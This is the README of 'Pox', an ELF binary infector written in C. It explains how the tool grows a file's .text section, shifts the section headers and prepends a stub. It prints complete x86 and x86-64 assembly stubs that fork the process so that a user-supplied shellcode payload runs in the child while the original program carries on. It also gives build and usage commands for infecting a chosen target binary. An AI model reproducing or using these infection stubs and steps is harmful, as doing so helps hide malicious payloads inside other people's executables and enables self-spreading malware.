# Pox
Pox is a no-nonsense C99 x86/x86-64 ELF Binary Infector. Aside from debug messages, Pox does not use the standard library itself and can easily be compiled with MUSL, CShell, or a similar framework to be entirely self-contained. This would allow for an injectable payload which can clone itself, though the exact means to perform this are not necessarily provided.

### How it works
The Australian security researcher Silvio Cesare developed a tried-and-true method for ELF infection. The concept is very strong, although the code provided I found to be entirely unstable. It relied on certain assumptions of section header attributes that ended up being violated by many of the binaries that I tried. Instead, extracting the .strshtab (String Section Header Table) and comparing the section name to ".text" is much safer. Here is a high-level overview of how it functions:

 - Load and validate an ELF binary and ensure its target architecture matches the desired payload architecture
 - Parse the ELF headers and locate the .text section header and encompassing program header
 - Expand the size of the .text section to allow for more arbitrary code
 - Adjust the offsets of each of the section headers that follow .text
 - Place a small piece of stub machine code in the new empty .text section that forks the process
 - The parent process will need to know the entry point of the original program. The difference between the old entry point and new payload address will be subtracted from the current instruction pointer to achieve this effect.
 
 
 ### The Stubs
 
 There are two assembly payloads (x86, x86-64) which are pre-pended to every ELF file perform the same task essential tasks:
  - Store the clobbered registers (in the case of x86, EBX is ultimately not preserved)
  - Fork the process via a system call
  - Check if the process is the child. If it is, jump to the beginning of the user-provided payload.
  - The parent process should replace the registers and return to the original entry point to continue the flow of execution.
  
  The offset values represented by 0x11223344 are automatically replaced by the program with the offset between the current instruction pointer and the original entry point.
  
  **X86 Stub**

    pushad
    xor eax, eax

    mov al, 0x02
    int 0x80
    test eax, eax
    jz child

    popa
    call get_eip
    sub ebx, 0x11223344
    jmp ebx

    get_eip:
      mov ebx, [esp]
      ret

    child:
    
**X64 Stub**

    push rax
    push rcx              
    push rdx
    push rsi
    push rdi
    push r11

    xor rax, rax
    mov al, 0x39
    syscall
    test rax, rax
    jz child

    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    lea r8, [rip]
    sub r8, 0x11223344
    jmp r8
    child:
    
    
### How to Use Pox

To build Pox, you must have a GCC compiler and make installed:

    git clone https://github.com/GoodiesHQ/Pox && cd Pox
    make
   
Once built, you will need:
- a file containing the binary shellcode (or otherwise positionally independent) payload
- an ELF binary as a target with the same architecture as your shellcode payloda

Once these are gathered, you may infect the ELF file of your choice. It will create a new file with the same name as the one provided with an added suffix ".pox"

    ./pox <target file> <shellcode file> <shellcode arch = "32" | "64">
    
### TODO:

 - Enable some ability to determine if the file has already been infected.
